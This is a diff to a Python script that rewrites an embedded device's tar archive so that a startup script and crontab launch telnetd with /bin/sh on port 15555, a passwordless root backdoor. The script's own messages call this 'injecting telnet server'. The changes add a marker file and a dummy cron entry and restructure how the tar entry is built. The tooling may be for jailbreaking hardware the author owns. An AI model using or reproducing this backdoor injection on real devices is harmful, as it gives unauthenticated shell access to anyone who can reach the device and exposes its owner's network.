@@ -121,6 +121,7 @@ existing_info = archive.getmember('mnt/mtd/acc')
 
 file_data = StringIO()
 file_data.write("#!/bin/sh\n")
+file_data.write("echo 1 > /ran_start\n")
 if list_files:
 	file_data.write("/bin/ls -lR / | /bin/gzip > /mnt/mtd/ls.log.gz\n")
 file_data.write("/usr/bin/nohup /usr/sbin/telnetd -F -l /bin/sh -p 15555 </dev/null >/dev/null 2>/dev/null &\n")
@@ -129,34 +130,35 @@ if pwn_2605:
 file_data.seek(0)
 file_data = file_data.read().encode('ascii')
 
-
 crontab_data = StringIO()
 if inject_crontab:
 	if list_files:
 		crontab_data.write("*/3\t*\t*\t*\t*\t/bin/ls -lR / | /bin/gzip > /mnt/mtd/ls.log.gz\n")	
+		
+	crontab_data.write("1\t1\t1\t1\t1\t/bin/cat < /dev/null\n")
 	crontab_data.write("*\t*\t*\t*\t*\t/usr/sbin/telnetd -F -l /bin/sh -p 15555\n")
 	
 crontab_data.seek(0)
 crontab_data = crontab_data.read().encode('ascii')
 
-binary_file_data = BytesIO()
-file_size = binary_file_data.write(crontab_data)
-binary_file_data.seek(0)
-entry_info = tarfile.TarInfo(name='mnt/mtd/crontab')
-
-entry_info.mode = 0o777
-entry_info.uid = existing_info.uid
-entry_info.gid = existing_info.gid
-entry_info.size = file_size
-entry_info.mtime = existing_info.mtime
-entry_info.type = existing_info.type
-entry_info.uname = existing_info.uname
-entry_info.gname = existing_info.gname
-entry_info.devmajor = existing_info.devmajor
-entry_info.devminor = existing_info.devminor
-entry_info.chksum = tarfile.calc_chksums(entry_info.tobuf())[0]
-
 if add_file:
+	binary_file_data = BytesIO()
+	file_size = binary_file_data.write(crontab_data)
+	binary_file_data.seek(0)
+	entry_info = tarfile.TarInfo(name='mnt/mtd/crontab')
+
+	entry_info.mode = 0o777
+	entry_info.uid = existing_info.uid
+	entry_info.gid = existing_info.gid
+	entry_info.size = file_size
+	entry_info.mtime = existing_info.mtime
+	entry_info.type = existing_info.type
+	entry_info.uname = existing_info.uname
+	entry_info.gname = existing_info.gname
+	entry_info.devmajor = existing_info.devmajor
+	entry_info.devminor = existing_info.devminor
+	entry_info.chksum = tarfile.calc_chksums(entry_info.tobuf())[0]
+
 	if inject_crontab:
 		sys.stdout.write("injecting telnet server into crontab\n")
 	else:
@@ -185,7 +187,7 @@ else:
 
 	entry_info.chksum = tarfile.calc_chksums(entry_info.tobuf())[0]
 
-	sys.stdout.write("injecting telnet server into %r\n" % (path,))
+	sys.stdout.write("injecting telnet server into %r, %d bytes total\n" % (path, file_size,))
 	replacement_archive.addfile(entry_info, binary_file_data)
 
 replacement_archive.close()
